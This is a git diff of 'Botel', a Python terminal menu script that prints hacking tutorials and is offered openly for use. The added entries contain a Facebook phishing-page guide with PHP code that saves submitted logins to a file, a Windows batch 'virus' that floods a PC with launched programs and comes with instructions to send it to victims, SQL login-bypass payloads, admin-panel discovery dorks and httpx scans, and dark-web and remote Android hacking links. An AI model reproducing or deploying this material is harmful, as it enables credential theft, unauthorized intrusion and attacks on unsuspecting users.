@@ -1,8 +1,13 @@
 import time as t
 import os
+#import requests
+green = "\033[01;32;40m"
+red = "\033[01;31;40m"
+yellow = '\033[01;33;40m'
+white = '\033[01;37;40m'
 os.system("clear")
 
-print("Opening Bot")
+print(yellow + "Opening Bot")
 t.sleep(3)
 os.system("clear")
 print("Starting BOT in 5 secs")
@@ -29,7 +34,7 @@ print("BOT have started")
 
 t.sleep(1)
 os.system("clear")
-print("""
+print(green + """
  _
 ( )                    _               _
 | |                   ( )      _ _ _ _( )
@@ -52,10 +57,6 @@ if "Spider" in name or "spider" in name:
   Have a nice day.
   Thanks for creating me.
   You are my God""")
-  print("""BOTEL:Welcome Boss.
-  Have a nice day.
-  Thanks for creating me.
-  You are my God""")
 elif "lekzi" in name:
     print("""BOTEL:Welcome Alaye lekzi
   My boss always speak about you
@@ -65,7 +66,7 @@ elif "Lekzi" in name:
   print("""BOTEL:Welcome Alaye Lekzi
   My boss always speak about you
   Thanks for helping my boss
-  I would like to speak with your boy""")
+  I would like to speak with your bot""")
 else:
 
   print("BOTEL:Welcome", name)
@@ -73,8 +74,10 @@ else:
 
 t.sleep(7)
 def loop():
+  os.system("clear")
+  print(yellow)
   os.system("figlet Botel")
-  print("""BOTEL:I have some hacking tutorials which might be useful to you
+  print(green + """BOTEL:I have some hacking tutorials which might be useful to you
 This are the Hacking tutorials
 [1] 💻Hack android with PDF💻
 [2] Carding Tools
@@ -87,12 +90,22 @@ This are the Hacking tutorials
 [9] How to get free airtime
 [10] Send me money
 [11] Hack a random website
-[12] Update me
+[12] Darkweb Links
+[13] Create a Scampage
+[14] How to connect VPN to Pc
+[15] Transfer and receive Money in all Countries
+[16] How to get Company admin panels
+[17] How to hack an android device remotely
+[18] Create a virus to crash PC
+[19] Email-Extractor Pro
+[20] Update me
+[21]About Me
+[22]Credits
 """)
   c = input("BOTEL:Choose Your Choice: ")
 
   os.system("clear")
-  t.sleep(5)
+  t.sleep(1)
   if c == "1":
     print("""
  👨‍💻HOW TO HACK ANY DEVICE VIA PDF👨‍💻
@@ -384,7 +397,7 @@ LINK:—  https://mega.nz/folder/SWYCxTiD#4-vDw2bbHFYS4n7WGyDcLg
       HERE IS THE LINK OF FILE FROM WHICH YOU CAN LEARN  RUBY COMPLETELY :— https://mega.nz/folder/KL5lhYqQ#oBPUPHUrf9gKxdaZnWoAzA
       """)
     else:
-     print("BOTEL says \"Not available\"")
+     print(red + "BOTEL says \"Not available\"" + white)
   elif c == "5":
     print("""
   Techinical Bureau 4⁰4:
@@ -748,7 +761,7 @@ No dulling
     
     God bless you as you do so""")
   elif c == "11":
-       print("""How to hack random web via sql auth bypass.
+  	print("""How to hack random web via sql auth bypass.
 Search any of this in google
 inurl:/admin login site:in
 inurl:/login/login.php admin
@@ -807,9 +820,228 @@ or true--
 ") or ("x")=("x
 ")) or (("x"))=(("x
 
-If ur successful you've hacked a web
-""")
+If ur successful you've hacked a web""")
   elif c == "12":
+  	print("""🔰Some DarkWeb Links🔰
+
+🌀 Tin Hat - http://tinhat233xymse34.onion/
+
+🌀 Security in a Box - http://bpo4ybbs2apk4sk4.onion/
+
+🌀 Culus - http://gkde65w5likrxegsfhmorwuheppqfyfjimbz4m76jd72tih7jcfq4uqd.onion/
+
+🌀 8Chan - http://oxwugzccvk3dk6tj.onion
+
+🌀 Phobos - http://phobosxilamwcg75xt22id7aywkzol6q6rfl2flipcqoc4e4ahima5id.onion
+
+🌀 Invidious - http://kgg2m7yk5aybusll.onion/
+
+🌀 Outlaw Wiki - http://outlawxmutl6yw3t.onion/
+
+🌀 Tordex - http://tordex7iie7z2wcg.onion/
+
+🌀 2019 Hidden Wiki - http://z5taguvepvuevyp3.onion
+
+🌀 Onion Link Directory - http://oniondirljacm547.onion/
+
+🌀 Onion Search Engine - http://5u56fjmxu63xcmbk.onion/
+""")
+  elif c == "13":
+  	print("""Topic: creating a phishing link without termux
+We are using facebook login for this
+1.download naked browser
+Search for www.Facebook.com
+Drag the side of the browser
+Tap page source
+It will show it source code
+Copy and paste it on notepad++
+Then save it As index.html
+Then creat another file as post.php
+Copy and paste this there 
+
+
+<?php
+header (‘Location:http://www.facebook.com/’);
+$handle = fopen(“usernames.txt”, “a”);
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, “=”);
+fwrite($handle, $value);
+fwrite($handle, “\”);
+}
+fwrite($handle, “\”);
+fclose($handle);
+exit;
+?>
+
+
+
+Go back to your HTML code search for login.php
+Change it to post.php
+
+After everything host on 00webhosting""")
+  elif c == "14":
+  	print("""Download Every proxy, then turn on http proxy.
+Then go to your laptop setting and search internet setting, move to connection and select Lan setting, then check your every proxy you'll see one  IP address there just write the IP address in  your laptop in the required place from the LAN setting then connect it and turn on your hotspot and data connection and ha tunnel plus.
+Note: whenever you want to connect again check your every proxy the IP address there usually changes so you re enter it again""")
+  elif c == "15":
+  	print("""How to receive and transfer money to other countries
+
+https://selar.co/me/dashboard
+""")
+  elif c == "16":
+  	print("""⚙️Some ways to find company admin panels 💻
+
+ 1. Using Google Dorks:
+
+ site: target.com inurl: admin |  administrator |  adm |  login |  l0gin |  wp-login
+
+ intitle: "login" "admin" site: target.com
+
+ intitle: "index of / admin" site: target.com
+
+ inurl: admin intitle: admin intext: admin
+
+ 2. Using httpx and a wordlist:
+
+ httpx -l hosts.txt -paths /root/admin-login.txt -threads 100 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-length
+
+ httpx -l hosts.txt-ports 80,443,8009,8080,8081,8090,8180,8443 -paths /root/admin-login.txt -threads 100 -random-agent -x GET, POST -tech-detect -status-  code -follow-redirects -title -content-length
+
+ 3. Using utilities:
+
+ https://github.com/the-c0d3r/admin-finder
+ https://github.com/RedVirus0/Admin-Finder
+ https://github.com/mIcHyAmRaNe/okadminfinder3
+ https://github.com/penucuriCode/findlogin
+ https://github.com/fnk0c/cangibrina
+
+ 4. Using search engines:
+
+ Shodan:
+
+ ssl.cert.subject.cn:"company.com "http.title:" admin "
+
+ ssl: "company.com" http.title: "admin"
+
+ ssl.cert.subject.cn:"company.com "admin
+
+ ssl: "company.com" admin
+
+ Fofa:
+
+ cert = "company.com" && title = "admin"
+
+ cert.subject = "company" && title = "admin"
+
+ cert = "company.com" && body = "admin"
+
+ cert.subject = "company" && body = "admin"
+
+ ZoomEye:
+
+ ssl: company.com + title: "admin"
+
+ ssl: company.com + admin
+
+ Censys (IPv4):
+
+ (services.tls.certificates.leaf_data.issuer.common_name: company.com) AND services.http.response.html_t""")
+  elif c == "17":
+  	print("""*How to hack an Android device remotely (without metasploit)*
+
+Tutorial by : AnonyminHack5
+Size: 20.3mb
+File Type: mkv video 
+Tutorial Duration: 15mins 28secs
+
+Download Link: 
+https://www.mediafire.com/file/c7ptlfw7j22mm0e/How_to_hack_an_android_device_remotely_%2528without_metasploit%2529.mkv/file
+
+*Tutorial is only for Educational purposes*
+*Be ethical*
+
+Best to Open with vlc player""")
+  elif c == "18":
+  	print("""👹👹HOW TO CREATE A VIRUS THAT WILL CRASH PC👹👹
+
+Step 1:Click on window button and search for "Notepad"
+
+Step 2:Open notepad and paste the following command
+
+@echo off
+echo  %DATE%
+echo  %TIME%
+echo "Sorry😥,Your pc is gone"
+ipconfig release
+start setting
+start notepad
+start Firefox
+start internet Explorer
+start Google Chrome
+start music groover
+start Microsoft Store
+start PowerShell
+start keyspy VPN
+start hotspot shield
+start opera mini
+start notepad
+start calculator
+start Touch
+start command prompt
+start clock
+start camera
+start setting
+start camera
+start setting
+start notepad
+start Free_internet
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+echo  %random%
+start Free_internet
+start Free_internet
+start Free_internet
+
+
+
+Step 3:Save the file as "Free_internet.bat" (It will make the file  keep running continuously by itself after running  it by you) 
+
+Step 4:send the file to victims... 
+
+ONLY FOR EDUCATIONAL PURPOSES 😊😇
+
+👹More Dangerous Virus coming👹
+
+Made by Anon Lêkzï.... 
+
+
+
+If u are doubting, kindly run it on your PC  😌😌😌...""")
+  elif c == "19":
+  	print("""DOWNLOAD EMAIL EXTRACTOR PRO HERE
+https://emailextractorpro.com/download.html""")
+  elif c == "20":
       os.system("""cd $HOME
     rm -f -r Botel
     git clone https://github.com/spider863644/Botel
@@ -819,9 +1051,19 @@ If ur successful you've hacked a web
     cd Botel
     python3 Botel.py"""), exit()
       os.system("cd Botel")
+  elif c == "21":
+       print("""Botel is a python script that teaches programming and hacking and also gives free stuffs
+    
+    It was developed by Spider Anongreyhat""")
+  elif c == "22":
+      print("""
+      Credit goes to
+      [1]Spider Anongreyhat
+      [2]Anonlekzi
+      """)
     
   else:
-      print(c,"Not in option...Choose a valid option!")
+      print(red, c,"Not in option...Choose a valid option!" + white)
       t.sleep(3)
       loop()
 
